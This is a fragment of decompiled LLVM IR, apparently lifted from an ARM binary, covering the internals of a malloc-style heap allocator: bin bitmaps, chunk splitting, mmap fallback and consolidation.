  store i32 %v0_12878, i32* %v4_12878, align 4
  %v0_1287c = load i32, i32* %r1.global-to-local, align 4
  %v1_1287c = load i32, i32* %r2.global-to-local, align 4
  %v2_1287c = add i32 %v1_1287c, 4
  %v3_1287c = inttoptr i32 %v2_1287c to i32*
  store i32 %v0_1287c, i32* %v3_1287c, align 4
  %v0_12880 = load i32, i32* @r6, align 4
  %v1_12880 = load i32, i32* %r2.global-to-local, align 4
  %v2_12880 = add i32 %v1_12880, 12
  %v3_12880 = inttoptr i32 %v2_12880 to i32*
  store i32 %v0_12880, i32* %v3_12880, align 4
  %v0_12884 = load i32, i32* @r6, align 4
  %v1_12884 = load i32, i32* %r2.global-to-local, align 4
  %v2_12884 = add i32 %v1_12884, 8
  %v3_12884 = inttoptr i32 %v2_12884 to i32*
  store i32 %v0_12884, i32* %v3_12884, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12890:                               ; preds = %dec_label_pc_127f8, %dec_label_pc_127e8
  %v1_12820 = phi i32 [ %storemerge.pre, %dec_label_pc_127e8 ], [ %v3_12804, %dec_label_pc_127f8 ]
  store i32 %v1_12820, i32* %ip.global-to-local, align 4
  %v9_12890 = icmp eq i32 %v1_12820, %v1_127ec
  br i1 %v9_12890, label %dec_label_pc_12898.loopexit, label %dec_label_pc_127f8

dec_label_pc_12898.loopexit:                      ; preds = %dec_label_pc_12890
  br label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_127e0.dec_label_pc_12898_crit_edge, %dec_label_pc_12898.loopexit
  %v4_128c8.pre-phi = phi i32 [ %.pre203, %dec_label_pc_127e0.dec_label_pc_12898_crit_edge ], [ %v4_127e8, %dec_label_pc_12898.loopexit ]
  %v1_12898 = add i32 %v0_12898.pre, 1
  store i32 %v1_12898, i32* %r2.global-to-local, align 4
  %v1_1289c = urem i32 %v1_12898, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r0.global-to-local, align 4
  %v6_128a8 = shl i32 1, %v1_1289c
  store i32 %v6_128a8, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_128b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_128b0, i32* %r3.global-to-local, align 4
  %v3_128b4 = udiv i32 %v1_12898, 32
  store i32 %v3_128b4, i32* @r5, align 4
  %v4_128b8 = mul nuw nsw i32 %v3_128b4, 4
  %v5_128b8 = add i32 %v4_128b0, %v4_128b8
  store i32 %v5_128b8, i32* %r2.global-to-local, align 4
  %v1_128bc = add i32 %v5_128b8, 820
  %v2_128bc = inttoptr i32 %v1_128bc to i32*
  %v3_128bc = load i32, i32* %v2_128bc, align 4
  store i32 %v3_128bc, i32* @r4, align 4
  %v1_128c0 = add i32 %v4_128b0, 52
  store i32 %v1_128c0, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_128c8 = add i32 %v1_128c0, %v4_128c8.pre-phi
  store i32 %v5_128c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_128cc

dec_label_pc_128cc:                               ; preds = %dec_label_pc_12934, %dec_label_pc_12898
  %v1_128d4 = phi i32 [ %v1_128d4.pre, %dec_label_pc_12934 ], [ %v3_128bc, %dec_label_pc_12898 ]
  %v0_128d4 = phi i32 [ %v0_128cc.pre, %dec_label_pc_12934 ], [ %v6_128a8, %dec_label_pc_12898 ]
  %v1_128cc = sub i32 1, %v0_128d4
  %v2_128cc = icmp ult i32 %v0_128d4, 2
  %v1_128cc. = select i1 %v2_128cc, i32 %v1_128cc, i32 0
  store i32 %v1_128cc., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_128d4, %v1_128d4
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_128cc
  %v5_128d8 = or i32 %v1_128cc., 1
  store i32 %v5_128d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_128e4.preheader

bb145:                                            ; preds = %dec_label_pc_128cc
  %v2_128dc = icmp eq i32 %v1_128cc., 0
  br i1 %v2_128dc, label %.dec_label_pc_12920.preheader_crit_edge, label %dec_label_pc_128e4.preheader

.dec_label_pc_12920.preheader_crit_edge:          ; preds = %bb145
  %v0_1291857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12920.preheader

dec_label_pc_128e4.preheader:                     ; preds = %bb145, %.thread15
  %v0_128e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_128e4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128e4.preheader, %dec_label_pc_128f0
  %v0_128e4 = phi i32 [ %v0_128e4.pre, %dec_label_pc_128e4.preheader ], [ %v1_128e4, %dec_label_pc_128f0 ]
  %v1_128e4 = add i32 %v0_128e4, 1
  store i32 %v1_128e4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_128e4, 2
  br i1 %tmp211, label %dec_label_pc_129c4.loopexit, label %dec_label_pc_128f0

dec_label_pc_128f0:                               ; preds = %dec_label_pc_128e4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r3.global-to-local, align 4
  %v1_128f4 = load i32, i32* @r8, align 4
  %v2_128f4 = add i32 %v1_128f4, ptrtoint (i32* @global_var_22244.363 to i32)
  %v3_128f4 = inttoptr i32 %v2_128f4 to i32*
  %v4_128f4 = load i32, i32* %v3_128f4, align 4
  store i32 %v4_128f4, i32* %r2.global-to-local, align 4
  %v4_128f8 = mul i32 %v1_128e4, 4
  %v5_128f8 = add i32 %v4_128f4, %v4_128f8
  store i32 %v5_128f8, i32* %r3.global-to-local, align 4
  %v1_128fc = add i32 %v5_128f8, 820
  %v2_128fc = inttoptr i32 %v1_128fc to i32*
  %v3_128fc = load i32, i32* %v2_128fc, align 4
  store i32 %v3_128fc, i32* @r4, align 4
  %v2_12900 = icmp eq i32 %v3_128fc, 0
  br i1 %v2_12900, label %dec_label_pc_128e4, label %dec_label_pc_12908

dec_label_pc_12908:                               ; preds = %dec_label_pc_128f0
  %v4_12908 = mul i32 %v1_128e4, 256
  %v5_12908 = add i32 %v4_128f4, %v4_12908
  store i32 %v5_12908, i32* %r3.global-to-local, align 4
  %v1_1290c = add i32 %v5_12908, 44
  store i32 %v1_1290c, i32* %r0.global-to-local, align 4
  %v0_12910 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12910, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12920.preheader

dec_label_pc_12920.preheader:                     ; preds = %.dec_label_pc_12920.preheader_crit_edge, %dec_label_pc_12908
  %v0_1291857 = phi i32 [ %v1_1290c, %dec_label_pc_12908 ], [ %v0_1291857.pre, %.dec_label_pc_12920.preheader_crit_edge ]
  %v0_1293c = phi i32 [ %v3_128fc, %dec_label_pc_12908 ], [ %v1_128d4, %.dec_label_pc_12920.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12910, %dec_label_pc_12908 ], [ %v0_128d4, %.dec_label_pc_12920.preheader_crit_edge ]
  %v2_1292054 = and i32 %ip.promoted, %v0_1293c
  %v4_1292056 = icmp eq i32 %v2_1292054, 0
  br i1 %v4_1292056, label %dec_label_pc_12918, label %dec_label_pc_12928

dec_label_pc_12918:                               ; preds = %dec_label_pc_12920.preheader, %dec_label_pc_12918
  %v2_1291c59 = phi i32 [ %v2_1291c, %dec_label_pc_12918 ], [ %ip.promoted, %dec_label_pc_12920.preheader ]
  %v0_1291858 = phi i32 [ %v1_12918, %dec_label_pc_12918 ], [ %v0_1291857, %dec_label_pc_12920.preheader ]
  %v1_12918 = add i32 %v0_1291858, 8
  %v2_1291c = mul i32 %v2_1291c59, 2
  %v2_12920 = and i32 %v2_1291c, %v0_1293c
  %v4_12920 = icmp eq i32 %v2_12920, 0
  br i1 %v4_12920, label %dec_label_pc_12918, label %dec_label_pc_12920.dec_label_pc_12928_crit_edge

dec_label_pc_12920.dec_label_pc_12928_crit_edge:  ; preds = %dec_label_pc_12918
  store i32 %v1_12918, i32* %r0.global-to-local, align 4
  store i32 %v2_1291c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12928

dec_label_pc_12928:                               ; preds = %dec_label_pc_12920.dec_label_pc_12928_crit_edge, %dec_label_pc_12920.preheader
  %v0_12948 = phi i32 [ %v2_1291c, %dec_label_pc_12920.dec_label_pc_12928_crit_edge ], [ %ip.promoted, %dec_label_pc_12920.preheader ]
  %v0_1296c = phi i32 [ %v1_12918, %dec_label_pc_12920.dec_label_pc_12928_crit_edge ], [ %v0_1291857, %dec_label_pc_12920.preheader ]
  %v1_12928 = add i32 %v0_1296c, 12
  %v2_12928 = inttoptr i32 %v1_12928 to i32*
  %v3_12928 = load i32, i32* %v2_12928, align 4
  store i32 %v3_12928, i32* @lr, align 4
  %v9_1292c = icmp eq i32 %v3_12928, %v0_1296c
  br i1 %v9_1292c, label %dec_label_pc_12934, label %dec_label_pc_12954

dec_label_pc_12934:                               ; preds = %dec_label_pc_12928
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r0.global-to-local, align 4
  %v1_12938 = load i32, i32* @r8, align 4
  %v2_12938 = add i32 %v1_12938, ptrtoint (i32* @global_var_22244.363 to i32)
  %v3_12938 = inttoptr i32 %v2_12938 to i32*
  %v4_12938 = load i32, i32* %v3_12938, align 4
  %v2_1293c = sub i32 -1, %v0_12948
  %v3_1293c = and i32 %v0_1293c, %v2_1293c
  store i32 %v3_1293c, i32* @r4, align 4
  %v1_12940 = load i32, i32* @r5, align 4
  %v4_12940 = mul i32 %v1_12940, 4
  %v5_12940 = add i32 %v4_12940, %v4_12938
  store i32 %v5_12940, i32* %r3.global-to-local, align 4
  %v1_12944 = add i32 %v0_1296c, 8
  store i32 %v1_12944, i32* %r0.global-to-local, align 4
  %v2_12948 = mul i32 %v0_12948, 2
  store i32 %v2_12948, i32* %ip.global-to-local, align 4
  %v2_1294c = add i32 %v5_12940, 820
  %v3_1294c = inttoptr i32 %v2_1294c to i32*
  store i32 %v3_1293c, i32* %v3_1294c, align 4
  %v0_128cc.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_128d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_128cc

dec_label_pc_12954:                               ; preds = %dec_label_pc_12928
  %v1_12954 = add i32 %v3_12928, 4
  %v2_12954 = inttoptr i32 %v1_12954 to i32*
  %v3_12954 = load i32, i32* %v2_12954, align 4
  store i32 %v3_12954, i32* %r3.global-to-local, align 4
  %v1_12958 = and i32 %v3_12954, -4
  store i32 %v1_12958, i32* %r2.global-to-local, align 4
  %v0_1295c = load i32, i32* @sl, align 4
  %v2_1295c = sub i32 %v1_12958, %v0_1295c
  store i32 %v2_1295c, i32* %ip.global-to-local, align 4
  %v1_12960 = add i32 %v3_12928, 12
  %v2_12960 = inttoptr i32 %v1_12960 to i32*
  %v3_12960 = load i32, i32* %v2_12960, align 4
  store i32 %v3_12960, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1295c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12954
  %v6_12968 = add i32 %v1_12958, %v3_12928
  store i32 %v6_12968, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12954, %bb146
  %v2_1296c = add i32 %v3_12960, 8
  %v3_1296c = inttoptr i32 %v2_1296c to i32*
  store i32 %v0_1296c, i32* %v3_1296c, align 4
  %v0_12970 = load i32, i32* %r3.global-to-local, align 4
  %v1_12970 = load i32, i32* %r0.global-to-local, align 4
  %v2_12970 = add i32 %v1_12970, 12
  %v3_12970 = inttoptr i32 %v2_12970 to i32*
  store i32 %v0_12970, i32* %v3_12970, align 4
  %v4_12974 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12850_crit_edge, label %dec_label_pc_12980

.dec_label_pc_12850_crit_edge:                    ; preds = %bb147
  %v5_12974 = add i32 %v4_12974, 8
  store i32 %v5_12974, i32* %r4.global-to-local, align 4
  %v4_12978 = load i32, i32* %r2.global-to-local, align 4
  %v5_12978 = add i32 %v4_12978, 4
  %v6_12978 = inttoptr i32 %v5_12978 to i32*
  %v7_12978 = load i32, i32* %v6_12978, align 4
  store i32 %v7_12978, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12850

dec_label_pc_12980:                               ; preds = %bb147
  %v1_12980 = load i32, i32* @sl, align 4
  %v2_12980 = add i32 %v1_12980, %v4_12974
  store i32 %v2_12980, i32* %r1.global-to-local, align 4
  %v1_12988 = load i32, i32* @r6, align 4
  %v2_12988 = add i32 %v1_12988, 8
  %v3_12988 = inttoptr i32 %v2_12988 to i32*
  store i32 %v2_12980, i32* %v3_12988, align 4
  %v0_1298c = load i32, i32* %r1.global-to-local, align 4
  %v1_1298c = load i32, i32* @r6, align 4
  %v2_1298c = add i32 %v1_1298c, 12
  %v3_1298c = inttoptr i32 %v2_1298c to i32*
  store i32 %v0_1298c, i32* %v3_1298c, align 4
  %v0_12990 = load i32, i32* @r6, align 4
  %v1_12990 = load i32, i32* %r1.global-to-local, align 4
  %v2_12990 = add i32 %v1_12990, 8
  %v3_12990 = inttoptr i32 %v2_12990 to i32*
  store i32 %v0_12990, i32* %v3_12990, align 4
  %v0_12994 = load i32, i32* @r6, align 4
  %v1_12994 = load i32, i32* %r1.global-to-local, align 4
  %v2_12994 = add i32 %v1_12994, 12
  %v3_12994 = inttoptr i32 %v2_12994 to i32*
  store i32 %v0_12994, i32* %v3_12994, align 4
  %tmp213 = icmp ult i32 %v1_12980, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_12980
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v8_129a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v8_129a0, i32* %r3.global-to-local, align 4
  %v4_129a4 = load i32, i32* %r1.global-to-local, align 4
  %v6_129a4 = add i32 %v8_129a0, 48
  %v7_129a4 = inttoptr i32 %v6_129a4 to i32*
  store i32 %v4_129a4, i32* %v7_129a4, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12980, %bb148
  %v0_129a8 = load i32, i32* @sl, align 4
  %v1_129a8 = or i32 %v0_129a8, 1
  store i32 %v1_129a8, i32* %r2.global-to-local, align 4
  %v0_129ac = load i32, i32* %ip.global-to-local, align 4
  %v1_129ac = or i32 %v0_129ac, 1
  store i32 %v1_129ac, i32* %r3.global-to-local, align 4
  %v0_129b0 = load i32, i32* @lr, align 4
  %v1_129b0 = add i32 %v0_129b0, 8
  store i32 %v1_129b0, i32* %r4.global-to-local, align 4
  %v2_129b4 = add i32 %v0_129b0, 4
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 %v1_129a8, i32* %v3_129b4, align 4
  %v0_129b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_129b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_129b8 = add i32 %v1_129b8, %v0_129b8
  %v4_129b8 = inttoptr i32 %v3_129b8 to i32*
  store i32 %v0_129b8, i32* %v4_129b8, align 4
  %v0_129bc = load i32, i32* %r3.global-to-local, align 4
  %v1_129bc = load i32, i32* %r1.global-to-local, align 4
  %v2_129bc = add i32 %v1_129bc, 4
  %v3_129bc = inttoptr i32 %v2_129bc to i32*
  store i32 %v0_129bc, i32* %v3_129bc, align 4
  br label %dec_label_pc_12e18

dec_label_pc_129c4.loopexit:                      ; preds = %dec_label_pc_128e4
  br label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_129c4.loopexit, %dec_label_pc_125d8, %dec_label_pc_125e0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  %v4_129cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_129cc, i32* @r0, align 4
  %v1_129d0 = add i32 %v4_129cc, 44
  %v2_129d0 = inttoptr i32 %v1_129d0 to i32*
  %v3_129d0 = load i32, i32* %v2_129d0, align 4
  store i32 %v3_129d0, i32* %ip.global-to-local, align 4
  %v1_129d4 = add i32 %v3_129d0, 4
  %v2_129d4 = inttoptr i32 %v1_129d4 to i32*
  %v3_129d4 = load i32, i32* %v2_129d4, align 4
  %v0_129d8 = load i32, i32* @sl, align 4
  %v1_129d8 = add i32 %v0_129d8, 16
  store i32 %v1_129d8, i32* %r1.global-to-local, align 4
  %v1_129dc = and i32 %v3_129d4, -4
  store i32 %v1_129dc, i32* %r3.global-to-local, align 4
  %v3_129e0 = icmp ult i32 %v1_129dc, %v1_129d8
  br i1 %v3_129e0, label %dec_label_pc_12a10, label %dec_label_pc_129ec

dec_label_pc_129ec:                               ; preds = %dec_label_pc_129c4
  %v2_129ec = sub i32 %v1_129dc, %v0_129d8
  %v2_129f0 = add i32 %v0_129d8, %v3_129d0
  store i32 %v2_129f0, i32* %r1.global-to-local, align 4
  %v1_129f4 = or i32 %v2_129ec, 1
  store i32 %v1_129f4, i32* %r3.global-to-local, align 4
  %v1_129f8 = or i32 %v0_129d8, 1
  store i32 %v1_129f8, i32* %r2.global-to-local, align 4
  %v1_129fc = add i32 %v3_129d0, 8
  store i32 %v1_129fc, i32* %r4.global-to-local, align 4
  store i32 %v1_129f8, i32* %v2_129d4, align 4
  %v0_12a04 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a04 = load i32, i32* @r0, align 4
  %v2_12a04 = add i32 %v1_12a04, 44
  %v3_12a04 = inttoptr i32 %v2_12a04 to i32*
  store i32 %v0_12a04, i32* %v3_12a04, align 4
  %v0_12a08 = load i32, i32* %r3.global-to-local, align 4
  %v1_12a08 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a08 = add i32 %v1_12a08, 4
  %v3_12a08 = inttoptr i32 %v2_12a08 to i32*
  store i32 %v0_12a08, i32* %v3_12a08, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12a10:                               ; preds = %dec_label_pc_129c4
  %v1_12a10 = inttoptr i32 %v4_129cc to i32*
  %v2_12a10 = load i32, i32* %v1_12a10, align 4
  store i32 %v2_12a10, i32* %r3.global-to-local, align 4
  %v1_12a14 = and i32 %v2_12a10, 2
  store i32 %v1_12a14, i32* %ip.global-to-local, align 4
  %v2_12a14 = icmp eq i32 %v1_12a14, 0
  %v1_12a18 = add i32 %v4_129cc, 860
  %v2_12a18 = inttoptr i32 %v1_12a18 to i32*
  %v3_12a18 = load i32, i32* %v2_12a18, align 4
  store i32 %v3_12a18, i32* %r1.global-to-local, align 4
  br i1 %v2_12a14, label %dec_label_pc_12a30, label %dec_label_pc_12a20

dec_label_pc_12a20:                               ; preds = %dec_label_pc_12a10
  %v0_12a20 = call i32 @__malloc_consolidate()
  %v0_12a24 = load i32, i32* @sl, align 4
  %v1_12a24 = add i32 %v0_12a24, -7
  store i32 %v1_12a24, i32* @r0, align 4
  %v0_12a28 = call i32 @malloc()
  store i32 %v0_12a28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e14

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12a10
  %v1_12a30 = add i32 %v4_129cc, 844
  %v2_12a30 = inttoptr i32 %v1_12a30 to i32*
  %v3_12a30 = load i32, i32* %v2_12a30, align 4
  store i32 %v3_12a30, i32* %r3.global-to-local, align 4
  %v3_12a34 = icmp ult i32 %v0_129d8, %v3_12a30
  %v1_12a38 = add i32 %v3_12a18, -1
  store i32 %v1_12a38, i32* %sb.global-to-local, align 4
  br i1 %v3_12a34, label %dec_label_pc_12b0c, label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a30
  %v1_12a40 = add i32 %v4_129cc, 852
  %v2_12a40 = inttoptr i32 %v1_12a40 to i32*
  %v3_12a40 = load i32, i32* %v2_12a40, align 4
  store i32 %v3_12a40, i32* %r2.global-to-local, align 4
  %v1_12a44 = add i32 %v4_129cc, 848
  %v2_12a44 = inttoptr i32 %v1_12a44 to i32*
  %v3_12a44 = load i32, i32* %v2_12a44, align 4
  store i32 %v3_12a44, i32* %r3.global-to-local, align 4
  %v6_12a4c = icmp slt i32 %v3_12a44, %v3_12a40
  br i1 %v6_12a4c, label %dec_label_pc_12a50, label %dec_label_pc_12b0c

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a40
  %v1_12a50 = add i32 %v0_129d8, 10
  %v2_12a54 = add i32 %v1_12a50, %v3_12a18
  store i32 %v2_12a54, i32* %r3.global-to-local, align 4
  %v2_12a58 = sub i32 0, %v3_12a18
  %v3_12a58 = and i32 %v2_12a54, %v2_12a58
  store i32 %v3_12a58, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12a58, %v0_129d8
  br i1 %tmp214, label %dec_label_pc_12a64, label %dec_label_pc_12b0c

dec_label_pc_12a64:                               ; preds = %dec_label_pc_12a50
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12a58, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12a7c = call i32 @mmap(i32 0, i32 %v3_12a58, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12a7c, i32* %r0.global-to-local, align 4
  %v7_12a80 = icmp eq i32 %v6_12a7c, -1
  br i1 %v7_12a80, label %dec_label_pc_12a64.dec_label_pc_12b0c_crit_edge, label %dec_label_pc_12a88

dec_label_pc_12a64.dec_label_pc_12b0c_crit_edge:  ; preds = %dec_label_pc_12a64
  %v1_12b30.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12b0c

dec_label_pc_12a88:                               ; preds = %dec_label_pc_12a64
  %v1_12a88 = urem i32 %v6_12a7c, 8
  store i32 %v1_12a88, i32* %r2.global-to-local, align 4
  %v2_12a88 = icmp eq i32 %v1_12a88, 0
  br i1 %v2_12a88, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12a88
  %v2_12a8c = sub nsw i32 8, %v1_12a88
  store i32 %v2_12a8c, i32* %r3.global-to-local, align 4
  %v2_12a90 = load i32, i32* @r4, align 4
  %v3_12a90 = sub i32 %v2_12a90, %v2_12a8c
  %v3_12a94 = add i32 %v2_12a8c, %v6_12a7c
  store i32 %v3_12a94, i32* %lr.global-to-local, align 4
  %v2_12a9c = or i32 %v3_12a90, 2
  store i32 %v2_12a9c, i32* %r2.global-to-local, align 4
  %v5_12aa4 = inttoptr i32 %v3_12a94 to i32*
  store i32 %v2_12a8c, i32* %v5_12aa4, align 4
  %v1_12aa8 = load i32, i32* %r2.global-to-local, align 4
  %v2_12aa8 = load i32, i32* %lr.global-to-local, align 4
  %v3_12aa8 = add i32 %v2_12aa8, 4
  %v4_12aa8 = inttoptr i32 %v3_12aa8 to i32*
  store i32 %v1_12aa8, i32* %v4_12aa8, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_12a88
  store i32 %v6_12a7c, i32* %lr.global-to-local, align 4
  %v1_12aa050 = load i32, i32* @r4, align 4
  %v2_12aa051 = or i32 %v1_12aa050, 2
  store i32 %v2_12aa051, i32* %r3.global-to-local, align 4
  %v3_12aac = inttoptr i32 %v6_12a7c to i32*
  store i32 0, i32* %v3_12aac, align 4
  %v1_12ab0 = load i32, i32* %r3.global-to-local, align 4
  %v2_12ab0 = load i32, i32* %lr.global-to-local, align 4
  %v3_12ab0 = add i32 %v2_12ab0, 4
  %v4_12ab0 = inttoptr i32 %v3_12ab0 to i32*
  store i32 %v1_12ab0, i32* %v4_12ab0, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12abc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12abc, i32* %ip.global-to-local, align 4
  %v1_12ac0 = add i32 %v4_12abc, 848
  %v2_12ac0 = inttoptr i32 %v1_12ac0 to i32*
  %v3_12ac0 = load i32, i32* %v2_12ac0, align 4
  store i32 %v3_12ac0, i32* %r3.global-to-local, align 4
  %v1_12ac4 = add i32 %v4_12abc, 856
  %v2_12ac4 = inttoptr i32 %v1_12ac4 to i32*
  %v3_12ac4 = load i32, i32* %v2_12ac4, align 4
  store i32 %v3_12ac4, i32* %r2.global-to-local, align 4
  %v1_12ac8 = add i32 %v3_12ac0, 1
  store i32 %v1_12ac8, i32* %r3.global-to-local, align 4
  %v7_12ad0 = icmp sgt i32 %v1_12ac8, %v3_12ac4
  br i1 %v7_12ad0, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12ac8, i32* %v2_12ac4, align 4
  %v0_12ad4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12ad4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12ad4 = phi i32 [ %v4_12abc, %.thread30 ], [ %v1_12ad4.pre, %bb150 ]
  %v0_12ad4 = phi i32 [ %v1_12ac8, %.thread30 ], [ %v0_12ad4.pre, %bb150 ]
  %v2_12ad4 = add i32 %v1_12ad4, 848
  %v3_12ad4 = inttoptr i32 %v2_12ad4 to i32*
  store i32 %v0_12ad4, i32* %v3_12ad4, align 4
  %v0_12ad8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ad8 = add i32 %v0_12ad8, 868
  %v2_12ad8 = inttoptr i32 %v1_12ad8 to i32*
  %v3_12ad8 = load i32, i32* %v2_12ad8, align 4
  store i32 %v3_12ad8, i32* %r3.global-to-local, align 4
  %v1_12adc = add i32 %v0_12ad8, 880
  %v2_12adc = inttoptr i32 %v1_12adc to i32*
  %v3_12adc = load i32, i32* %v2_12adc, align 4
  store i32 %v3_12adc, i32* %r2.global-to-local, align 4
  %v0_12ae0 = load i32, i32* @r4, align 4
  %v2_12ae0 = add i32 %v0_12ae0, %v3_12ad8
  store i32 %v2_12ae0, i32* %r1.global-to-local, align 4
  %v1_12ae4 = add i32 %v0_12ad8, 872
  %v2_12ae4 = inttoptr i32 %v1_12ae4 to i32*
  %v3_12ae4 = load i32, i32* %v2_12ae4, align 4
  store i32 %v3_12ae4, i32* %r3.global-to-local, align 4
  %v1_12aec = add i32 %v0_12ad8, 884
  %v2_12aec = inttoptr i32 %v1_12aec to i32*
  %v3_12aec = load i32, i32* %v2_12aec, align 4
  store i32 %v3_12aec, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12ae0, %v3_12adc
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12ae0, i32* %v2_12adc, align 4
  %v0_12af4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12af4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_12af4 = phi i32 [ %v0_12ad8, %bb151 ], [ %v1_12af4.pre, %bb152 ]
  %v0_12af4 = phi i32 [ %v2_12ae0, %bb151 ], [ %v0_12af4.pre, %bb152 ]
  %v2_12af4 = add i32 %v1_12af4, 868
  %v3_12af4 = inttoptr i32 %v2_12af4 to i32*
  store i32 %v0_12af4, i32* %v3_12af4, align 4
  %v0_12af8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12af8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12af8 = add i32 %v1_12af8, %v0_12af8
  store i32 %v2_12af8, i32* %r1.global-to-local, align 4
  %v1_12afc = load i32, i32* %r2.global-to-local, align 4
  %v0_12b00 = load i32, i32* %lr.global-to-local, align 4
  %v1_12b00 = add i32 %v0_12b00, 8
  store i32 %v1_12b00, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12af8, %v1_12afc
  br i1 %tmp216, label %bb154, label %dec_label_pc_12e14

bb154:                                            ; preds = %bb153
  %v5_12b04 = load i32, i32* %ip.global-to-local, align 4
  %v6_12b04 = add i32 %v5_12b04, 884
  %v7_12b04 = inttoptr i32 %v6_12b04 to i32*
  store i32 %v2_12af8, i32* %v7_12b04, align 4
  br label %dec_label_pc_12e14

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12a50, %dec_label_pc_12a30, %dec_label_pc_12a64.dec_label_pc_12b0c_crit_edge, %dec_label_pc_12a40
  %v1_12b30 = phi i32 [ %v1_12b30.pre, %dec_label_pc_12a64.dec_label_pc_12b0c_crit_edge ], [ %v0_129d8, %dec_label_pc_12a40 ], [ %v0_129d8, %dec_label_pc_12a30 ], [ %v0_129d8, %dec_label_pc_12a50 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  %v4_12b14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b14, i32* %r3.global-to-local, align 4
  %v1_12b18 = add i32 %v4_12b14, 44
  %v2_12b18 = inttoptr i32 %v1_12b18 to i32*
  %v3_12b18 = load i32, i32* %v2_12b18, align 4
  store i32 %v3_12b18, i32* %r0.global-to-local, align 4
  %v1_12b1c = add i32 %v4_12b14, 864
  %v2_12b1c = inttoptr i32 %v1_12b1c to i32*
  %v3_12b1c = load i32, i32* %v2_12b1c, align 4
  store i32 %v3_12b1c, i32* %r2.global-to-local, align 4
